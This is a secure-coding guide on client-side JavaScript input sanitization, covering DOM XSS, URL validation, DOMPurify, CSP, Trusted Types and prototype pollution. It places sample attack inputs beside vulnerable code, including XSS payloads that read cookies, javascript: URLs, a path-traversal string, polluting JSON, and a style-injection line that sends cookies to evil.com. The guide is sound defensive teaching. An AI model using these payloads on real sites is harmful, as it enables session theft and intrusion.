## Sanitizing User Input


### DOM-Based Attack Vectors

DOM-based vulnerabilities occur entirely client-side when JavaScript processes user-controlled data unsafely. Unlike reflected or stored XSS where the server sends malicious content, DOM-based attacks manipulate the page through client-side code execution without server involvement.

#### Sources and Sinks

**Sources** are JavaScript properties containing user-controllable data:

- `location.href`, `location.search`, `location.hash`
- `document.referrer`
- `document.cookie`
- `localStorage`, `sessionStorage`
- `postMessage` event data
- `window.name`
- URL parameters via `URLSearchParams`

**Sinks** are dangerous JavaScript methods that execute or render data:

- `element.innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `element.setAttribute()` with event handlers
- `location.href`, `location.assign()`, `location.replace()`
- `element.insertAdjacentHTML()`
- `script.src`, `script.text`, `script.textContent`

```javascript
// Vulnerable: source → sink without sanitization
const params = new URLSearchParams(location.search);
const username = params.get('name');
document.getElementById('greeting').innerHTML = `Hello ${username}!`;

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
```

### Safe DOM Manipulation Methods

#### textContent vs innerHTML

`textContent` treats all input as plain text, preventing HTML parsing and script execution. `innerHTML` parses HTML, enabling XSS when used with user input.

```javascript
// Vulnerable
element.innerHTML = userInput;
// Input: <img src=x onerror=alert(1)> executes JavaScript

// Safe
element.textContent = userInput;
// Input: <img src=x onerror=alert(1)> displays as literal text
```

`textContent` is the default choice for displaying user-provided content. Use `innerHTML` only with trusted, sanitized content.

#### createTextNode for Dynamic Content

`document.createTextNode()` explicitly creates text nodes that cannot execute code:

```javascript
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

// Even malicious input becomes inert text
const malicious = '<script>alert(1)</script>';
const node = document.createTextNode(malicious);
element.appendChild(node);
// Displays: <script>alert(1)</script> as text
```

#### createElement with Property Assignment

Create elements programmatically and set properties rather than parsing HTML strings:

```javascript
// Vulnerable
element.innerHTML = `<a href="${userUrl}">Click here</a>`;

// Safe
const link = document.createElement('a');
link.href = userUrl;  // Browser sanitizes URL
link.textContent = 'Click here';
element.appendChild(link);
```

Property assignment invokes browser-native sanitization. Setting `href` via property normalizes the URL and prevents `javascript:` URLs in modern browsers when combined with proper validation.

### Dangerous JavaScript Patterns

#### eval() and Function Constructor

`eval()` executes arbitrary JavaScript strings. Never use `eval()` with any user-influenced data, even indirectly.

```javascript
// Vulnerable
const userExpression = getUserInput();
const result = eval(userExpression);  // Executes any JavaScript

// Vulnerable - Function constructor is equivalent to eval
const fn = new Function('x', userExpression);
fn(5);
```

**Alternatives**:

- For JSON parsing: Use `JSON.parse()` instead of `eval()`
- For calculations: Build expression parsers or use safe libraries
- For dynamic behavior: Use object maps or strategy patterns

```javascript
// Safe JSON parsing
const data = JSON.parse(jsonString);

// Safe calculation with parser
import mathjs from 'mathjs';
const result = mathjs.evaluate(userExpression, scope);  // Sandboxed
```

#### setTimeout/setInterval with Strings

String arguments to `setTimeout()` and `setInterval()` are evaluated like `eval()`:

```javascript
// Vulnerable
setTimeout(userInput, 1000);  // Executes as JavaScript
setInterval(`doSomething(${userInput})`, 1000);

// Safe - use function references
setTimeout(() => {
  doSomething(userInput);  // userInput is data, not code
}, 1000);
```

Always pass functions, never strings, to timing functions.

#### Event Handler String Assignment

Assigning strings to event handler properties executes them as JavaScript:

```javascript
// Vulnerable
element.setAttribute('onclick', userInput);
element.onclick = new Function(userInput);

// Safe - use addEventListener
element.addEventListener('click', () => {
  handleClick(userInput);  // userInput is data
});
```

Modern event handling via `addEventListener()` separates code from data.

### URL-Based Attacks

#### javascript: Protocol

The `javascript:` pseudo-protocol executes JavaScript when used in URL contexts:

```javascript
// Vulnerable
element.href = userInput;
// Attack: javascript:alert(document.cookie)

// Safe - validate protocol
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (isSafeUrl(userInput)) {
  element.href = userInput;
} else {
  element.href = '#';  // or show error
}
```

Always validate URL protocols before assignment to `href`, `src`, or navigation methods.

#### data: URLs

`data:` URLs embed content directly, enabling XSS through HTML or script content:

```javascript
// Attack vectors
element.src = 'data:text/html,<script>alert(1)</script>';
element.href = 'data:text/html,<body onload=alert(1)>';

// Safe validation
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    // Only allow specific safe protocols
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

Blocklist `data:`, `javascript:`, `vbscript:`, and `file:` protocols. Allowlist only necessary protocols like `http:`, `https:`, and `mailto:`.

#### Location Manipulation

Directly assigning to `location` properties can execute JavaScript:

```javascript
// Vulnerable
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
location = userInput;

// Attack: javascript:alert(1)

// Safe - validate before navigation
function safeNavigate(url) {
  if (isSafeUrl(url)) {
    location.href = url;
  } else {
    console.error('Invalid URL');
  }
}
```

#### Hash-Based Navigation

URL fragments (`location.hash`) can trigger XSS through unsafe DOM manipulation:

```javascript
// Vulnerable pattern
window.addEventListener('hashchange', () => {
  const section = location.hash.slice(1);
  document.getElementById('content').innerHTML = 
    `<h1>Section: ${section}</h1>`;
});

// Attack: #<img src=x onerror=alert(1)>

// Safe pattern
window.addEventListener('hashchange', () => {
  const section = location.hash.slice(1);
  document.getElementById('content').textContent = section;
});
```

### HTML Sanitization Libraries

#### DOMPurify

DOMPurify is the industry-standard HTML sanitizer, using browser DOM APIs to parse and clean HTML safely:

```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// Custom configuration
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false
});

// Hook for custom processing
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Force all links to open in new tab
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

DOMPurify handles edge cases like:

- Mutation XSS (mXSS) bypasses
- SVG-based attacks
- XML namespace confusion
- CSS expression injection
- Protocol-based attacks

#### Configuration Options

**ALLOWED_TAGS**: Allowlist of permitted HTML tags. Default is comprehensive but can be restricted:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
});
```

**ALLOWED_ATTR**: Permitted attributes. Restrict to prevent event handlers and dangerous attributes:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title']
});
```

**FORBID_TAGS** and **FORBID_ATTR**: Explicitly blocklist tags/attributes:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  FORBID_TAGS: ['style', 'form', 'input'],
  FORBID_ATTR: ['style', 'onerror', 'onload']
});
```

**SAFE_FOR_TEMPLATES**: Prevents template injection by encoding mustache/angular template syntax:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  SAFE_FOR_TEMPLATES: true  // Encodes {{ }}, undefined, etc.
});
```

#### Return Types

DOMPurify can return different formats:

```javascript
// Default: HTML string
const html = DOMPurify.sanitize(userInput);

// DocumentFragment for direct DOM insertion
const fragment = DOMPurify.sanitize(userInput, {
  RETURN_DOM_FRAGMENT: true
});
element.appendChild(fragment);

// DOM element
const dom = DOMPurify.sanitize(userInput, {
  RETURN_DOM: true
});
```

`RETURN_DOM_FRAGMENT` is most efficient for direct insertion, avoiding serialization overhead.

### Client-Side Validation vs Sanitization

#### Validation: Reject Invalid Input

Validation checks if input matches expected format and rejects non-conforming data:

```javascript
function validateEmail(email) {
  const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!pattern.test(email)) {
    throw new Error('Invalid email format');
  }
  return email;
}

function validateAge(age) {
  const num = parseInt(age, 10);
  if (isNaN(num) || num < 0 || num > 150) {
    throw new Error('Invalid age');
  }
  return num;
}
```

Validation is appropriate when input must conform to strict specifications. It provides clear error messages for user correction.

#### Sanitization: Make Input Safe

Sanitization modifies input to remove dangerous content while preserving useful data:

```javascript
function sanitizeFilename(filename) {
  // Remove path separators and dangerous characters
  return filename
    .replace(/[\/\\]/g, '')
    .replace(/\.\./g, '')
    .replace(/[<>:"|?*\x00-\x1f]/g, '')
    .substring(0, 255);
}

function sanitizeUsername(username) {
  // Keep only alphanumeric and safe characters
  return username
    .replace(/[^a-zA-Z0-9_-]/g, '')
    .substring(0, 30);
}
```

Sanitization is appropriate for free-form content where some flexibility is needed. Combined with validation for critical fields.

### Attribute-Based XSS

#### Event Handler Attributes

Event handlers in attributes execute JavaScript:

```javascript
// Vulnerable
element.innerHTML = `<img src="${userUrl}">`;
// Attack: x" onerror="alert(1)

// Safe - use createElement
const img = document.createElement('img');
img.src = userUrl;
element.appendChild(img);
```

Even when HTML context is properly quoted, attackers can inject additional attributes:

```javascript
// Still vulnerable despite quoting
element.innerHTML = `<img src="${escapeQuotes(userUrl)}">`;
// Attack: x" onload="alert(1)" foo="

// Proper fix: avoid innerHTML entirely
```

#### href and src Attribute Injection

Special attributes accept URLs that can execute JavaScript:

```javascript
// Vulnerable
element.innerHTML = `<a href="${userUrl}">Link</a>`;
// Attack: javascript:alert(1)

// Safe with validation
const link = document.createElement('a');
if (isSafeUrl(userUrl)) {
  link.href = userUrl;
  link.textContent = 'Link';
  element.appendChild(link);
}
```

#### style Attribute Injection

CSS in style attributes can exfiltrate data or inject content:

```javascript
// Vulnerable
element.innerHTML = `<div style="${userStyle}">Content</div>`;
// Attack: background:url('http://evil.com/steal?data='+document.cookie)
// Attack: expression(alert(1)) in IE

// Safe - use style object
const div = document.createElement('div');
div.style.color = userColor;  // Browser validates CSS properties
div.textContent = 'Content';
```

Use the `style` object API which validates and sanitizes CSS values. Avoid string-based style assignment.

### Content Security Policy (CSP) Integration

#### unsafe-inline and unsafe-eval

CSP directives restrict inline script and eval usage:

```http
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self';
```

This policy blocks:

- Inline `<script>` tags
- Inline event handlers (`onclick`, etc.)
- `javascript:` URLs
- `eval()`, `Function()`, `setTimeout(string)`

Forcing developers to use external scripts and `addEventListener()` eliminates many DOM-based XSS vectors.

#### Nonce-Based CSP

Nonce-based CSP allows specific inline scripts:

```html
<!-- Server generates cryptographic nonce -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'nonce-r4nd0m123'">

<!-- Only scripts with matching nonce execute -->
<script nonce="r4nd0m123">
  // This executes
</script>

<script>
  // This is blocked
</script>
```

Injected scripts cannot include the nonce (which is random per-response), preventing execution even if HTML injection occurs.

#### Strict Dynamic

`strict-dynamic` propagates trust to scripts loaded by trusted scripts:

```http
Content-Security-Policy: 
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

Scripts with the nonce can dynamically create additional scripts, but injected HTML cannot. This enables dynamic script loading while maintaining security.

### Framework-Specific Protections

#### React

React escapes content by default in JSX expressions:

```jsx
// Safe - automatically escaped
<div>{userInput}</div>

// Dangerous - bypasses protection
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**dangerouslySetInnerHTML** requires explicit opt-in and should only be used with sanitized content:

```jsx
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
```

React also protects href attributes from `javascript:` URLs in modern versions, but validation is still recommended.

#### Vue.js

Vue escapes interpolated content:

```vue
<!-- Safe - automatically escaped -->
<div>{{ userInput }}</div>

<!-- Dangerous - raw HTML -->
<div v-html="userInput"></div>
```

**v-html** directive renders raw HTML. Sanitize before use:

```vue
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>
```

#### Angular

Angular's template syntax automatically sanitizes values:

```typescript
// Safe - sanitized by Angular
<div>{{ userInput }}</div>
<div [innerHTML]="userInput"></div>  // Also sanitized

// Bypass sanitization (dangerous)
<div [innerHTML]="bypassedContent"></div>
```

To bypass sanitization (use with extreme caution):

```typescript
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

bypassSecurity(html: string) {
  // Only use with trusted, sanitized content
  return this.sanitizer.bypassSecurityTrustHtml(html);
}
```

Angular's built-in sanitizer is robust, but manual bypass requires external sanitization with DOMPurify.

### PostMessage Security

#### Origin Validation

`postMessage` enables cross-origin communication. Always validate message origin:

```javascript
// Vulnerable - accepts messages from any origin
window.addEventListener('message', (event) => {
  document.getElementById('output').innerHTML = event.data;
});

// Safe - validates origin
window.addEventListener('message', (event) => {
  // Check exact origin
  if (event.origin !== 'https://trusted-domain.com') {
    return;
  }
  
  // Validate message structure
  if (typeof event.data !== 'object' || !event.data.type) {
    return;
  }
  
  // Safe handling
  handleMessage(event.data);
});
```

Never use `startsWith()` or substring matching for origin validation - use exact equality.

#### Message Structure Validation

Validate message structure and types before processing:

```javascript
window.addEventListener('message', (event) => {
  if (event.origin !== TRUSTED_ORIGIN) return;
  
  const { type, payload } = event.data;
  
  // Allowlist message types
  const handlers = {
    'USER_DATA': handleUserData,
    'CONFIG_UPDATE': handleConfig
  };
  
  if (!handlers[type]) {
    console.error('Unknown message type:', type);
    return;
  }
  
  // Validate payload structure
  if (!validatePayload(type, payload)) {
    console.error('Invalid payload for type:', type);
    return;
  }
  
  handlers[type](payload);
});
```

#### Posting Messages Safely

When sending messages, specify target origin explicitly:

```javascript
// Vulnerable - any origin can receive
otherWindow.postMessage(data, '*');

// Safe - specific target
otherWindow.postMessage(data, 'https://trusted-domain.com');
```

Using `*` as target origin exposes data to any iframe or window that might have navigated to a malicious origin.

### Web Storage Security

#### localStorage/sessionStorage XSS

Storage APIs are subject to same-origin policy but vulnerable to XSS. Stored data persists across sessions:

```javascript
// Attacker injects XSS
localStorage.setItem('username', '<img src=x onerror=alert(1)>');

// Later, application reads and renders
const username = localStorage.getItem('username');
element.innerHTML = username;  // XSS executes
```

**Mitigation**:

- Sanitize data retrieved from storage before rendering
- Store structured data as JSON, parse before use
- Never use `innerHTML` with storage data

```javascript
// Safe pattern
const username = localStorage.getItem('username');
element.textContent = username;  // Treats as text

// Or sanitize if HTML is needed
const html = localStorage.getItem('content');
const clean = DOMPurify.sanitize(html);
element.innerHTML = clean;
```

#### Storage Isolation

Storage is isolated by origin (protocol + domain + port). Subdomain isolation prevents storage sharing:

- `app.example.com` cannot access `api.example.com` storage
- `http://example.com` cannot access `https://example.com` storage

Use separate subdomains for untrusted content to prevent storage contamination.

### Regular Expression Denial of Service (ReDoS)

#### Catastrophic Backtracking in JavaScript

JavaScript regex engine can exhibit exponential time complexity with certain patterns:

```javascript
// Vulnerable pattern
const pattern = /^(a+)+$/;
const input = 'a'.repeat(30) + '!';
pattern.test(input);  // Hangs browser

// Safe alternative
const pattern = /^a+$/;
```

Nested quantifiers (`(a+)+`, `(a*)*`, `(a+)*`) cause exponential backtracking when matching fails.

#### Input Length Limits

Limit input length before regex processing:

```javascript
function safeTest(pattern, input, maxLength = 1000) {
  if (input.length > maxLength) {
    throw new Error('Input too long');
  }
  return pattern.test(input);
}
```

#### Timeouts with Web Workers

Use Web Workers to isolate regex execution and implement timeouts:

```javascript
function testWithTimeout(pattern, input, timeout = 1000) {
  return new Promise((resolve, reject) => {
    const worker = new Worker('regex-worker.js');
    
    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error('Regex timeout'));
    }, timeout);
    
    worker.onmessage = (e) => {
      clearTimeout(timer);
      worker.terminate();
      resolve(e.data);
    };
    
    worker.postMessage({ pattern: pattern.source, input });
  });
}
```

### JSON Handling Security

#### JSON.parse Safely

`JSON.parse()` is safe from code execution but can throw exceptions:

```javascript
// Vulnerable to exceptions
const data = JSON.parse(userInput);

// Safe with error handling
function safeJsonParse(input, fallback = null) {
  try {
    return JSON.parse(input);
  } catch (e) {
    console.error('Invalid JSON:', e);
    return fallback;
  }
}
```

#### Prototype Pollution via JSON

Malicious JSON can pollute object prototypes:

```javascript
const malicious = '{"__proto__": {"isAdmin": true}}';
const obj = JSON.parse(malicious);
// Now ({}).isAdmin === true in some environments

// Mitigation: Object.create(null)
const safe = Object.assign(Object.create(null), JSON.parse(input));
```

Modern JavaScript engines mitigate `__proto__` pollution, but defensively create objects with null prototypes or use `Object.freeze()`:

```javascript
function secureJsonParse(input) {
  const obj = JSON.parse(input);
  delete obj.__proto__;
  delete obj.constructor;
  delete obj.prototype;
  return obj;
}
```

#### JSON Stringify Validation

Stringify user objects before storage to prevent storing functions or special objects:

```javascript
// Unsafe - stores function
localStorage.setItem('config', userConfig);

// Safe - serializes to JSON
localStorage.setItem('config', JSON.stringify(userConfig));
```

### Template Literal Injection

#### Tagged Templates

Untagged template literals can execute code through interpolation:

```javascript
// Vulnerable
const html = `<div>${userInput}</div>`;
element.innerHTML = html;

// Safe with tagged template
function safe(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = values[i - 1];
    return result + escape(value) + str;
  });
}

const html = safe`<div>${userInput}</div>`;
element.innerHTML = html;
```

#### HTML Template Tag

Create a reusable HTML escaping template tag:

```javascript
function html(strings, ...values) {
  const escaped = values.map(val => {
    if (val == null) return '';
    return String(val)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  });
  
  return strings.reduce((result, str, i) => {
    return result + str + (escaped[i] || '');
  }, '');
}

// Usage
const safe = html`<div>${userInput}</div>`;
element.innerHTML = safe;
```

### Client-Side Path Traversal

#### File API and Blob URLs

File API paths should never be constructed from user input:

```javascript
// Vulnerable - if filePath comes from user
fetch(`/files/${filePath}`)
  .then(r => r.blob())
  .then(blob => {
    const url = URL.createObjectURL(blob);
    window.open(url);
  });

// Attack: ../../../etc/passwd

// Safe - use indirect references
const fileId = userInput;
const allowedFiles = {
  'doc1': '/files/documents/file1.pdf',
  'doc2': '/files/documents/file2.pdf'
};

const actualPath = allowedFiles[fileId];
if (actualPath) {
  fetch(actualPath).then(/* ... */);
}
```

#### Download Filename Injection

Set download filenames from sanitized user input:

```javascript
// Vulnerable
const filename = userInput;
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = filename;  // User controls filename

// Safe - sanitize filename
function sanitizeFilename(name) {
  return name
    .replace(/[^a-zA-Z0-9._-]/g, '_')
    .substring(0, 100);
}

a.download = sanitizeFilename(userInput);
```

### Mutation XSS (mXSS)

Mutation XSS exploits browser HTML parser behavior where sanitized HTML mutates after parsing:

```javascript
// Input appears safe after sanitization
const input = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
const sanitized = DOMPurify.sanitize(input);
// Result: <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>

element.innerHTML = sanitized;
// Browser parsing causes mutation, img tag becomes active
```

**Mitigation**:

- Use DOMPurify which handles mXSS vectors
- Use `RETURN_DOM` or `RETURN_DOM_FRAGMENT` to avoid serialization round-trips
- Avoid double-parsing HTML

```javascript
// Safe - direct DOM insertion
const fragment = DOMPurify.sanitize(input, {
  RETURN_DOM_FRAGMENT: true
});
element.appendChild(fragment);
```

### Shadow DOM and Web Components

#### Slot Injection

Web component slots can be exploited if user content is projected:

```javascript
// Component template
class MyComponent extends HTMLElement {
  connectedCallback() {
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <div>
        <slot></slot>
      </div>
    `;
  }
}

// Usage with user content
const component = document.createElement('my-component');
component.innerHTML = userInput;  // Dangerous
document.body.appendChild(component);
```

**Mitigation**: Sanitize content before projection or use shadow DOM's isolation:

```javascript
const component = document.createElement('my-component');
const safe = DOMPurify.sanitize(userInput);
component.innerHTML = safe;
```

#### Closed Shadow Roots

Closed shadow roots prevent external JavaScript access but don't prevent XSS if the component itself processes user input unsafely:

```javascript
this.attachShadow({ mode: 'closed' });
// External code cannot access this.shadowRoot
// But component's own code can still have XSS vulnerabilities
```

Use closed mode for encapsulation, not security. Apply same sanitization practices inside components.

### Trusted Types

Trusted Types is a browser API that enforces type checking for dangerous sinks:

```javascript
// Enable Trusted Types via CSP
// Content-Security-Policy: require-trusted-types-for 'script'

// This will throw without Trusted Types
element.innerHTML = userInput;  // Error: assignment to innerHTML requires TrustedHTML

// Create policy
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => {
    return DOMPurify.sanitize(input);
  }
});

// Use policy to create Trusted Type
const trustedHtml = policy.createHTML(userInput);
element.innerHTML = trustedHtml;  // Works with TrustedHTML
```

Trusted Types enforces that dangerous sinks only accept typed objects created through policies, preventing accidental unsafe assignments.

#### Trusted Types Policies

Define policies for different contexts:

```javascript
const htmlPolicy = trustedTypes.createPolicy('html', {
  createHTML: (input) => DOMPurify.sanitize(input)
});

const urlPolicy = trustedTypes.createPolicy('url', {
  createScriptURL: (input) => {
    const url = new URL(input, location.origin);
    if (url.origin === location.origin) {
      return url.href;
    }
    throw new TypeError('Invalid script URL');
  }
});

// Usage
element.innerHTML = htmlPolicy.createHTML(userInput);
script.src = urlPolicy.createScriptURL('/scripts/app.js');
```

Default policy handles fallback cases:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (s) => {
    console.warn('Implicit HTML creation:', s);
    return DOMPurify.sanitize(s);
  },
  createScriptURL: (s) => {
    console.warn('Implicit script URL:', s);
    if (s.startsWith('/')) return s;
    throw new TypeError('Invalid URL');
  }
});
```

### Client-Side Prototype Pollution

Unsafe property assignment can pollute Object.prototype:

```javascript
// Vulnerable
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}

const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);
// Now: ({}).isAdmin === true
```

**Mitigation strategies**:

```javascript
// Check hasOwnProperty
function safeMerge(target, source) {
  for (let key in source) {
    if (source.hasOwnProperty(key) && key !== '__proto__' && key !== 'constructor') {
      target[key] = source[key];
    }
  }
}

// Use Map instead of objects
const config = new Map();
for (let [key, value] of Object.entries(userInput)) {
  config.set(key, value);
}

// Object.create(null) - no prototype
const obj = Object.assign(Object.create(null), userInput);

// Freeze prototypes
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

### Defense in Depth for Client-Side Security

#### Layered Protection

Implement multiple defensive layers:

1. **Input Validation**: Reject malformed data at entry
2. **Output Encoding**: Escape data at use point
3. **CSP**: Browser-level script restriction
4. **Trusted Types**: Type enforcement for sinks
5. **Sanitization**: Clean complex content (HTML)
6. **Framework Protection**: Leverage built-in security

```javascript
// Layer 1: Validation
if (!isValidFormat(userInput)) {
  throw new Error('Invalid input');
}

// Layer 2: Sanitization (for HTML content)
const clean = DOMPurify.sanitize(userInput);

// Layer 3: Trusted Types
const trusted = policy.createHTML(clean);

// Layer 4: Safe assignment
element.innerHTML = trusted;

// Layer 5: CSP blocks any bypassed scripts
```

#### Security Principles

**Principle of Least Privilege**: Grant minimum necessary permissions. Use read-only properties where possible:

```javascript
Object.defineProperty(obj, 'config', {
  value: config,
  writable: false,
  configurable: false
});
```

**Fail Secure**: On validation failure, deny access rather than attempting to fix:

```
// Bad — tries to fix
function processUrl(url) {
    if (url.includes('javascript:')) {
        url = url.replace('javascript:', ''); // Insufficient
    }
    return url;
}

// Good — rejects
function processUrl(url) {
    if (!isSafeUrl(url)) {
        throw new Error('Invalid URL');
    }
    return url;
}
```

**Defense in Depth**: Multiple independent security layers ensure single-point failures don't compromise security entirely.

---

